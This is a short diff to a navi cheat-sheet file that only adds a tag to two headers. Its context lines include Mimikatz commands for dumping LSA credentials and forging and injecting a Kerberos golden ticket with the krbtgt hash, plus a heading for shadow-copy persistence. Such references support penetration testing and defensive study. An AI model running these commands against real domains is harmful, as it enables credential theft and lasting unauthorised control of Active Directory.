@@ -1,4 +1,4 @@
-% persistence, golden ticket, active directory, mimikatz
+% sealldev, persistence, golden ticket, active directory, mimikatz
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -13,7 +13,7 @@ lsadump::lsa /patch
 kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<KRBTGT_NTLM_HASH> /ptt
 misc::cmd
 
-% persistence, shadow copies, active directory, vshadow
+% sealldev, persistence, shadow copies, active directory, vshadow
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
